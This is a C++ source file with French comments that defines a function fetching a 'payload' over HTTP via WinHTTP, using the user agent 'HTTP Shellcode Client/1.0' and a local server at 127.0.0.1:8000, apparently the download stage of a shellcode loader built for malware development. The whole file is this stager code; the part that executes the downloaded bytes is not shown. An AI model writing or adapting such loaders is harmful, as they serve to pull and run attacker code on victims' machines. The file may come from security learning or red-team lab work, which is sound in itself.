#include "HTTPClient.h"
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

// Fonction pour récupérer un payload via une requête HTTP GET
PBYTE getHTTPPayload(DWORD& payloadSize) {

    // Étape 1 : Initialiser une session WinHTTP
    HINTERNET hSession = WinHttpOpen(L"HTTP Shellcode Client/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        std::cerr << "Erreur : WinHttpOpen a échoué avec l'erreur : " << GetLastError() << std::endl;
        return nullptr;
    }

    // Étape 2 : Créer une connexion à l'hôte (127.0.0.1:8000)
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8000, 0);
    if (!hConnect) {
        std::cerr << "Erreur : WinHttpConnect a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // Étape 3 : Ouvrir une requête GET sur le chemin "/get"
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/get",
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        std::cerr << "Erreur : WinHttpOpenRequest a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // Étape 4 : Envoyer la requête
    BOOL result = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!result) {
        std::cerr << "Erreur : WinHttpSendRequest a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // Étape 5 : Recevoir la réponse
    result = WinHttpReceiveResponse(hRequest, nullptr);
    if (!result) {
        std::cerr << "Erreur : WinHttpReceiveResponse a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // Étape 6 : Vérifier la taille des données disponibles
    DWORD availableSize = 0;
    if (!WinHttpQueryDataAvailable(hRequest, &availableSize)) {
        std::cerr << "Erreur : WinHttpQueryDataAvailable a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // Étape 7 : Allouer de la mémoire pour recevoir les données
    PBYTE buffer = (PBYTE)LocalAlloc(LPTR, availableSize);
    if (!buffer) {
        std::cerr << "Erreur : Allocation mémoire insuffisante." << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    // Étape 8 : Lire les données HTTP dans le buffer
    DWORD bytesRead = 0;
    if (!WinHttpReadData(hRequest, buffer, availableSize, &bytesRead)) {
        std::cerr << "Erreur : WinHttpReadData a échoué avec l'erreur : " << GetLastError() << std::endl;
        LocalFree(buffer);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    payloadSize = bytesRead;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
